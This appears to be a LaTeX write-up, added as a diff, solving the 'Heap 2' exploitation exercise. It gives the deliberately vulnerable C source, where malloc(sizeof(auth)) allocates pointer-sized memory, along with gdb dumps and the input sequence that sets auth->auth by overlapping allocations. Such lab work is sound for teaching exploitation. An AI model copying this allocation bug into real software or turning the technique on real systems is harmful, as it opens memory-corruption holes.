@@ -1,0 +1,97 @@
+
+\begin{center}\begin{LARGE}Heap 2\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+We are told that when we see the message \code{you have logged in already} then
+the exploit is complete. Looking at the source code, we see that we need to
+modify \code{auth->auth} to be of a non-zero value.
+
+\subsection*{Idea and Attack process}
+
+We first realize that if we call \code{login} without declaring \code{auth} the
+program will crash. We cannot find a way to exploit this crash, so we look into
+what we can do after declaring \code{auth}. We see that allocation to \code{auth}
+has a strict check on the length of the input before allocation to \code{auth->name}.
+This means that we are not able to overflow the data in the struct such that
+we modify the int component of the struct.
+
+We see \code{strdup}, called for service. Through checking the documentation,
+we can see that the function allocates new memory on the heap and copies the
+string into newly allocated memory. We can verify this by first calling
+\code{auth aaaa} then followed by \code{servicaaaa} and \code{serviceeee} to see
+the effect and we can verify that it modifies the value in the address that contains
+\code{auth->auth} if we call for service twice.
+
+\begin{lstlisting}[language=bash]
+x/15x 0x804c000
+>>>0x804c000:      0x00000000      0x00000011      0x61616161      0x0000000a
+>>>0x804c010:      0x00000000      0x00000011      0x0a616161      0x00000000
+>>>0x804c020:      0x00000000      0x00000011      0x0a656565      0x00000000
+>>>0x804c030:      0x00000000      0x00000fd1      0x00000000
+\end{lstlisting}
+
+We begin our exploit based on the idea above.
+
+\begin{lstlisting}[language=bash]
+./heap2
+>>>[ auth = (nil), service = (nil) ]
+>>>auth a
+>>>[ auth = 0x804c008, service = (nil) ]
+>>>service a
+>>>[ auth = 0x804c008, service = 0x804c018 ]
+>>>service a
+>>>[ auth = 0x804c008, service = 0x804c028 ]
+>>>login
+>>>you have logged in already!  
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+struct auth {
+  char name[32];
+  int auth;
+};
+
+struct auth *auth;
+char *service;
+
+int main(int argc, char **argv)
+{
+  char line[128];
+
+  while(1) {
+    printf("[ auth = %p, service = %p ]\n", auth, service);
+
+    if(fgets(line, sizeof(line), stdin) == NULL) break;
+    
+    if(strncmp(line, "auth ", 5) == 0) {
+      auth = malloc(sizeof(auth));
+      memset(auth, 0, sizeof(auth));
+      if(strlen(line + 5) < 31) {
+        strcpy(auth->name, line + 5);
+      }
+    }
+    if(strncmp(line, "reset", 5) == 0) {
+      free(auth);
+    }
+    if(strncmp(line, "service", 6) == 0) {
+      service = strdup(line + 7);
+    }
+    if(strncmp(line, "login", 5) == 0) {
+      if(auth->auth) {
+        printf("you have logged in already!\n");
+      } else {
+        printf("please enter your password\n");
+      }
+    }
+  }
+}
+\end{lstlisting}
